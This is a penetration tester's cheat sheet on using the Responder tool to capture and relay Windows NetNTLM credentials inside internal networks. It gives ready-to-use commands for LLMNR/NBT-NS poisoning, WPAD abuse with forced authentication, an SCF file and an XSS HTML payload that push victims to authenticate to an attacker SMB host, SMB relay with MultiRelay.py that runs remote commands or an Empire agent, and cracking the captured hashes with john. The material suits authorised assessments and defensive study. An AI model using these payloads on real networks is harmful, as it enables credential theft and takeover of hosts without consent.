Responder, or how to get a first foot into an internal network 
=================================================================
When performing an internal security assessment, one of the fastest and most efficient way to take over an host is to use the Responder tool. This tool can be retrieved by cloning the following git repository (which is the most up-to-date as of now) :
 * https://github.com/lgandx/Responder.git

Tool(s) 
======

Responder for Linux
Inveigh for Windows

Responder laurent gaffié
 * BrowserListener.py
 * DHCP.py
 * Icmp-Redirect.py
 * SMBRelay.py
 * Tools added on lgandx's branch :
   + RunFinger.py
   + MultiRelay.py

A naive explanation of what is going on when using Responder :

```
------------|    Hey, are you domain.corp?       |---------
           1| ---------------------------------> |                
            |                                    |
            |    Yeah it's me                    |
  Victim(s) | <--------------------------------- |2  Attacker       
            |                                    |
            |    Good, here are my creds         |
           3| ---------------------------------> |                
            |                                    |
            |    Sry bud, wrong creds :/         |
            | <--------------------------------- |4               
------------|                                    |---------

 * 1- LLMNR, NBT-NS or MDNS request 
 * 2- Responder intercepting the request
 * 3- NTLMv2 challenge/response
 * 4- The attacker got the NetNTLM hash
```

The protocols used by Responder are :
 * LLMNR
 * NBT-NS
 * MDNS

Theses protocols can and should be disabled in a secured environment.

LLMNR  
=======
Protocol used in order to do domain name resolution when the DNS protocol fail to retrieve the asked domain.
 * Failed DNS
 * Multicast 224.0.0.252 UDP 5355
 * Windows


NBT-NS 
=======
Same as LLMNR but it uses the broadcast address rather than the multicast one
 * NetBIOS
 * Network's broadcast address on port TCP 139 (+UDP 137)
 * Windows

MDNS 
======
Also a domain name resolution protocol. Used mainly on non-conventional operating systems.
 * Multicast 224.0.0.251 (FF02::FB) UDP 5353
 * AppleTV, Chromecast, home speakers, NAS devices, etc...



Active Directory-Integrated DNS (ADI-DNS)
===================================
https://blog.netspi.com/exploiting-adidns/

Dynamic update DNS :
 * Update AD DNS record if not exists
 * Useful when multiple LLMNR/NBT-NS requests a particular domain
 * Implemented in new version of Inveigh (for the moment)


NTLM - NetNTLM 
===============
 * NetNTLM
  + Challenge/Response authentication (SMB / HTTP)
  + Responder
  + Captured on network

 * NTLM
  + SAM base
  + Retrieved only on local (with mimikatz for example)
  + !!! Used for Pass The Hash

Cheatsheet, tips and tricks 
================

## WPAD
The Web Proxy Auto-Discovery Protocol is a functionality enabled by default on every Windows since the 2000 version.

With this functionality, a host is capable of regularly check the domain name `wpad.corp.com`, which should hold the proxy configuration to be used for the current host's network.

It is possible to exploit this behaviour with Responder if the domain name `wpad` is not registered in the DNS server (and of course, if LLMNR and NBNS are enabled).

 * 1- Ping  `wpad.subdomain.department.corp.com`, `wpad.department.corp.com`, `wpad.corp.com`, ...
 * 2- If the domain doesn't exists, `sudo ./Responder.py -I <device> -w`
 * 3- Wait for trafic...

Note that this will only permits you to sniff users' http trafic.

It is possible to force an authentication form when the wpad file is requested with the -F option. This way, when the user completes this auth, Responder will receive its NetNTLM hash.
 * `sudo ./Responder.py -I <device> -wF`


## SCF file
Find a share with the write access enabled and create a new file with the extension `.scf` and the following content :
```
[Shell]
Command=2
IconFile=\\192.168.0.12\share\test.ico
[Taskbar]
Command=ToggleDesktop
```

As soon as an user open the share with the .scf file, Windows's Explorer will initiate an SMB handshake to 192.168.0.12\share\test.ico in order to retrieve the icon.

It is possible to combine this attack with an SMBrelay attack

## Trigger an NTML authentication with an XSS
If you have an XSS, it is possible to trick the browser to send an SMB request for retrieving a specific file, at least for some browsers...

 * Internet Explorer : SHUT UP AND TAKE MY CREDS
 * Firefox : only iframe -> a form will pop up and ask for the user's credentials (as well as a security alert)
 * Chrome : Too secure for ya, sry (I haven't managed to find a working payload for this browser)

Thus, on an environment where Internet Explorer is the main browser (**urgh**), it is possible to retrieve an NTLM authentication triggered by an XSS and uses it for an SMBRelay attack.

This is an example of the payload to inject in order to do the SMB Request :
```html
<html>
    <body>
        <p>test text</p>

        <!-- This following code will trigger an SMB Request to 172.16.1.10 -->
        <img src="\\172.16.1.10\resource.png" alt="ds"/>

        <!-- Firefox will filter out images, but not iframes -->
        <iframe src="\\172.16.1.10/bla.html"></iframe>
    </body>
</html>
```

## SMB Relay
The SMB Relay attack is one of the most simple way for compromising a host and is very easy to use.
The SANS image explains the attack very well : https://blogs.sans.org/pen-testing/files/2013/04/smbrelaypic2-relaydiagram.png
And of course, Responder have all the necessary tools for this attack.

##### Check the SMB Signing
The SMB Relay attack is inefficient on the hosts with the SMB Signing enabled. With the tool `RunFinger.py`, it is possible to fingerprint the targetted host's SMB configuration.

Exemple :
```
./RunFinger.py -i 172.16.11.172

Retrieving information for 172.16.11.172...
SMB signing: False
Null Sessions Allowed: True
Vulnerable to MS17-010: True
Server Time: 2018-07-11 19:21:24
OS version: 'Windows 7 Ultimate 7601 Service Pack 1'
Lanman Client: 'Windows 7 Ultimate 6.1'
Machine Hostname: 'XXXXXXX-PC'
This machine is part of the 'XXXXXXXXX' domain
```

##### Disable SMB and HTTP in Responder
If you intent to use an SMB/HTTP relay attack with an LLMNR/NBT-NS/MDNS poisoning, it is necessary to disable the SMB and/or HTTP services (because the python script `MultiRelay.py` will handle the incoming HTTP and SMB connections, and thus it needs to host the corresponding services)

In the Responder.conf file, configure the services as follows :
```
; Servers to start
SQL = On
SMB = Off
Kerberos = On
FTP = On
POP = On
SMTP = On
IMAP = On
HTTP = Off
HTTPS = On
DNS = On
LDAP = On
```

##### Launch MultiRelay.py

`sudo python MultiRelay.py -u ALL -t <target_ip> -c <command>`
NB: It is possible to launch a PowerShell command executing an Empire agent with this method, which is convenient for easily compromise an host.

##### Wait.
The waiting time depends on the type of attack in use (LLMNR/NBNS poisoning, SCF file, XSS, ...). 

## Go for the kill and crack the hashes
With john :
`john /path/to/Responder/logs/SMB-NTLMv2-SSP-xxx.xxx.xxx.xxx.txt -wordlist=/path/to/wordlist/rockyou.txt`

Wordlists :
 * https://github.com/danielmiessler/SecLists/tree/master/Passwords (recommended)
 * https://github.com/duyetdev/bruteforce-database
 * http://www.kali-linux.fr/forum/index.php?topic=2476.0 (never tried, but words in french)

